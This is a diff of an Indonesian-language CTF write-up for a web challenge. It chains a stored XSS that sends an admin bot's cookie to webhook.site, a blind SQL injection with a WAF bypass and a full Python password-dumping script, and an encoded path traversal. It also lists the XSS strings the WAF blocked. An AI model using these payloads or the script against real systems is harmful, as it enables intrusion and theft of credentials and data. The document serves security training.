@@ -8,126 +8,222 @@
 | 🏷️ **Category** | `web`              | 💯 **Points**  | `498`                  |
 | 🧑‍💻 **Team**    | `DOSCOM Zero Day Scholars` (x0rr-dan) | 🧩 **Solver** | [`solve.py`](solve.py) |
 
+![Modal soal BMN](img/01-soal.png)
+
 ---
 
 ### 📝 Deskripsi Soal
 
 > **Description dari panitia:**
->
-> BMN: yok dep app
-> dev: emangnya sudah di pentest?
-> BMN: gas aja yang penting botnya udah jalan
-> dev: awas akunmu
-> provider account like kind of developer (keknya keluar pas wave 2)
+> - **BMN: yok dep app**
+> - _dev: emangnya sudah di pentest?_
+> - **BMN: gas aja yang penting botnya udah jalan**
+> - _dev: awas akunmu_
+> - **provider account like kind of developer** (keknya keluar pas wave 2)
 
-**Connection info:** `http://15.232.64.175:13410`
+**Connection info:**
 
-![Modal soal BMN](img/01-soal.png)
+```text
+http://15.232.64.175:13410
+```
 
 ---
 
-### ⚔️ Exploitation
+### ⚔️ Exploitation Step
 
-Login ke dashboard dulu buat explore. Mata langsung fokus ke fitur transfer sama dokumen. Sempat
-ngehabisin waktu di fitur transfer yang kirain bakal IDOR, ternyata enggak, jadi fokus ke fitur
-dokumen.
+Login ke dashboard dulu, buat explore dashboardnya.
 
-![Dashboard nasabah](img/02-dashboard.png)
+![Dashboard user](img/02-dashboard.png)
 
-Baru sadar ada kolom status yang berubah otomatis: nunggu beberapa detik dia langsung `approved`.
-Berarti ada mekanisme auto-approve dari sistem atau user lain (ada bot admin yang ninjau dokumen).
-Kepikiran XSS buat curi cookie user lain.
+Disini mata saya langsung fokus ke fitur transfer sama dokumen, sempet ngehabisin banyak waktu buat
+explore fitur transfer yang kirain kita bakal IDOR buat dapetin apa gitu dan ternyata engga, jadi
+langsung fokus ke fitur dokumen.
 
-![Dokumen auto-approve jadi reviewed](img/03-dokumen-approve.png)
+![Daftar dokumen](img/03-dokumen-list.png)
 
-**1. XSS bypass WAF (tag `details`).** Basic payload XSS kena 403. Payload yang kena blok:
+Dan baru sadar kalo ada kolom status yang bakal berubah secara otomatis, nunggu beberapa detik gitu
+dia bakal langsung `approved`. Berarti ada mekanisme buat auto approve gitu dari sistem, atau user
+lain (ada bot admin yang ninjau).
 
-```
+![Dokumen pending](img/04-dokumen-pending.png)
+![Dokumen otomatis jadi reviewed](img/05-dokumen-reviewed.png)
+
+Sempet mikir kalo SSRF tapi kok keknya ga mungkin ya di fitur kek ginian, jadi langsung kepikiran
+apa XSS kali ya. Nyoba basic payload XSS kena 403, makin yakin kalo ini emang harus XSS buat dapetin
+cookie dari user lain.
+
+![Basic payload XSS kena 403](img/06-waf-xss.png)
+
+Payload yang kena blok:
+
+```javascript
 <script>alert(1)</script>
 javascript:
 <img src=>
-oneerror=   onload=   onfocus=   onclick=
+oneerror=
+onload=
+onfocus=
+onclick=
 <svg onload=>
 <body onload>
 document.cookie
 ```
 
-![XSS basic kena WAF 403](img/04-waf-xss.png)
+Setelah mikir buat pake tag yang bisa bypass WAF dari hasil fuzzing payload, saya kepikiran buat
+pake tag `details`.
 
-Dari hasil fuzzing, tag `details` lolos WAF. Payload-nya ditaruh sebagai isi dokumen, pas bot admin
-ninjau, `ontoggle` jalan dan cookie-nya dikirim ke webhook:
+![Referensi tag details](img/07-details-ref.png)
 
-![Payload details ontoggle di preview dokumen](img/05-xss-payload.png)
+Dengan hasil akhir seperti ini (payload ditaruh sebagai isi dokumen, pas bot ninjau `ontoggle`
+jalan dan cookie dikirim ke webhook):
 
-Hasilnya bocor `admin_token` di webhook.site:
+![Payload details ontoggle di preview dokumen](img/08-xss-payload.png)
 
-![admin_token ketangkep di webhook.site](img/06-webhook-token.png)
+Disini kita bisa dapet `admin_token=`:
 
-```
-admin_token=c18ab6435dd4141b246779795e7e9bd9
-```
-
-Tambahin value itu ke storage browser. Dashboard nggak berubah, tapi path `/admin` ternyata bisa
-diakses.
-
-![Panel Admin BMN di /admin](img/07-admin-panel.png)
-
-**2. Blind SQL injection di `/admin/reset`.** Di `/admin` cuma ada input reset username. Fuzzing
-pakai username ngawur, username valid, dan username + `'` buat lihat beda respon:
+![admin_token ketangkep di webhook.site](img/09-webhook-token.png)
 
 ```
-username=kuda                 -> {"status":"notfound"}   (user ga ada)
-username=lemper               -> {"status":"ok"}         (user valid)
-username=lemper'              -> {"status":"error"}      (SQL rusak -> injectable)
+"admin_token=c18ab6435dd4141b246779795e7e9bd9"
 ```
 
-sqlmap konfirmasi boolean-based blind (SQLite), tapi WAF bikin 403 terus:
+Terus langsung aja tambahin value baru di storage browser.
 
-![sqlmap boolean-based blind + WAF 403](img/08-sqlmap.png)
+![Set admin_token di storage browser](img/10-storage-cookie.png)
 
-Vuln SQLi tapi perlu bypass WAF. sqlmap ribet + tamper script gagal, jadi manual. `OR 1=1` biasa
-kena 403:
+Disini sempet bingung karna tampilan dashboard ga berubah apa apa, gaada menu baru atau semacamnya.
 
-![OR 1=1 kena WAF 403](img/09-waf-block-sqli.png)
+![Dashboard tetap sama](img/11-account.png)
 
-Separator yang lolos: `/**/`. Dengan `aaaa'/**/OR/**/1=1` lolos WAF (respon 200):
+Terus kepikiran buat akses path `/admin` dan ternyata bisa.
 
-![Bypass WAF pakai /**/](img/10-waf-bypass.png)
+![Panel Admin BMN di /admin](img/12-admin-panel.png)
 
-Karena boolean-based blind, brute-force dari panjang sampai isi data. Dari fitur reset pass tahu
-username user provider tetap `provider`, jadi dump password-nya. Solver di [`solve.py`](solve.py):
+Disini cuma ada input field buat reset username user. Sini saya fuzzing aja pake username ngawur
+dan valid, tambahin `'`, username user yang valid, sama username ngawur buat ngeliat perbedaan
+responnya.
+
+Hasil fuzzing nunjukin kalo user yang ngawur itu responsennya:
+
+```
+POST /admin/reset
+username=kuda
+
+Response
+{"message":"Pengguna tidak ditemukan.","status":"notfound"}
+```
+
+Hasil fuzzing nunjukin kalo user yang valid itu responsennya:
+
+```
+POST /admin/reset
+username=lemper
+
+Response
+{"message":"Tautan reset kata sandi telah dikirim ke nasabah.","status":"ok"}
+```
+
+Hasil fuzzing nunjukin kalo user yang valid atau pun ngawur dengan `'` itu responsennya:
+
+```
+POST /admin/reset
+username=lemper' / username=AAAAAAAAAAAAAAAAa'
+
+Response
+{"message":"Permintaan tidak dapat diproses.","status":"error"}
+```
+
+Disini saya pake sqlmap buat validasi apakah vuln sama SQL injection apa ga.
+
+![sqlmap boolean-based blind (SQLite)](img/13-sqlmap.png)
+
+Ternyata vuln tapi emang perlu bypass WAF-nya. Karna saya malas umek-umek pake sqlmap dan udah coba
+akalin via tamper script ga bisa, jadi mending manual aja.
+
+![OR 1=1 kena WAF 403](img/14-waf-block.png)
+
+Setelah nyoba ngakalin kita bisa bypass pake `/**/` sebagai separator.
+
+![Bypass WAF pakai /**/](img/15-waf-bypass.png)
+
+Karna emang dia boolean based blind, kita harus bruteforce dari length sampe isi dari data yang mau
+kita ambil. Karna dari soal itu bilang user provider itu kek user developer, jadi saya kepikiran
+dump password dari user provider. Tapi disini saya sempet bingung apakah usernya itu tetep provider
+apa beda.
+
+![Cek user provider valid](img/16-provider-user.png)
+
+Dari fitur reset pass kita tau kalo username untuk user provider itu ya tetep `provider` hehe, jadi
+langsung aja disini saya buat script buat dump password provider berdasarkan username. Solver
+lengkap di [`solve.py`](solve.py):
 
 ```python
-payload = f"nonexist'/**/OR/**/(unicode/**/(substr/**/(password,{position},1))={char_code}/**/AND/**/\"role\"='provider')/**/AND/**/'1'='1"
+import requests, time, sys
+
+COOKIE = {"admin_token": "c18ab6435dd4141b246779795e7e9bd9"}
+URL = "http://15.232.64.175:13410/admin/reset"
+HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"}
+
+# patokan ril or fek
+# {"status":"ok"}        -> TRUE response dari web
+# {"status":"notfound"}  -> FALSE ni kalo usernamenya gaada
+TRUE_MARKER = '"status":"ok"'
+FALSE_MARKER = '"status":"notfound"'
+
+def check_char(position, char_code):
+    payload = f"nonexist'/**/OR/**/(unicode/**/(substr/**/(password,{position},1))={char_code}/**/AND/**/\"role\"='provider')/**/AND/**/'1'='1"
+    r = requests.post(URL, headers=HEADERS, cookies=COOKIE, data={"username": payload})
+    return TRUE_MARKER in r.text
+
+def main():
+    print("[*] Dumping password provider...")
+    found = ""
+    not_found_count = 0
+    max_not_found = 3  # 3x ga nemu berarti kelar
+    for pos in range(1,100):
+        found_char = None
+        for code in range(32, 127):
+            if check_char(pos, code):
+                found_char = chr(code)
+                found += found_char
+                print(f"[+] FOUND '{found_char}' {pos:2d} | [{found}]")
+                not_found_count = 0
+                break
+
+        if found_char is None:
+            not_found_count += 1
+            print(f"[-] Pos {pos}: not_found_count={not_found_count}")
+
+        if not_found_count >= max_not_found:
+            print(f"[-] {max_not_found}x not found. Stoping.")
+            break
+
+    print(f"\n[+] PASSWORD PROVIDER: {found}")
+
+if __name__ == "__main__":
+    main()
 ```
 
-Hasil:
+![Dump password provider](img/17-dump-password.png)
 
 ```
 username: provider
 password: pr0v1d3r_k3y_2n26
 ```
 
-![Dump password provider](img/11-dump-password.png)
+Login pakai kredensial `provider` tadi, masuk ke Portal Provider.
 
-**3. Path traversal buat baca flag.** Login pakai kredensial `provider` tadi, masuk ke Portal
-Provider:
+![Portal Provider](img/18-portal-provider.png)
 
-![Portal Provider](img/12-portal-provider.png)
+Habis buka captcha di vault baru kita bisa ke statement buat get `welcome.txt`, yang setelah diliat
+dari requestnya fix path traversal.
 
-Habis buka captcha di vault, bisa ke statement buat get `welcome.txt`. Dari request-nya ketahuan
-path traversal:
+![Endpoint statement rawan path traversal](img/19-path-traversal.png)
 
-![Endpoint statement rawan path traversal](img/13-path-traversal.png)
-
-`../../../flag` kena WAF, jadi di-encode:
+Pake payload `..%2f..%2f..%2fflag` karna `../../../flag` kena WAF, jadi coba encode aja.
 
 ```
-..%2f..%2f..%2fflag
-```
-
-```
-FLAG: GEMASTIK19{bmn_x55b0t_bl1ndsqli_p4thtr4v_w4fbyp455_cha1n3d}
+GET /provider/statement?file=..%2f..%2f..%2fflag
 ```
 
 ---
@@ -138,9 +234,12 @@ FLAG: GEMASTIK19{bmn_x55b0t_bl1ndsqli_p4thtr4v_w4fbyp455_cha1n3d}
 GEMASTIK19{bmn_x55b0t_bl1ndsqli_p4thtr4v_w4fbyp455_cha1n3d}
 ```
 
+---
+
 ### 🔗 Referensi
 
-- PortSwigger — SQL Injection
-- PortSwigger — Path Traversal
-- PortSwigger — XSS
-- HTML `details` tag
+- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
+- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [HTML `details` tag](https://www.w3schools.com/tags/tag_details.asp)
+- chat ai
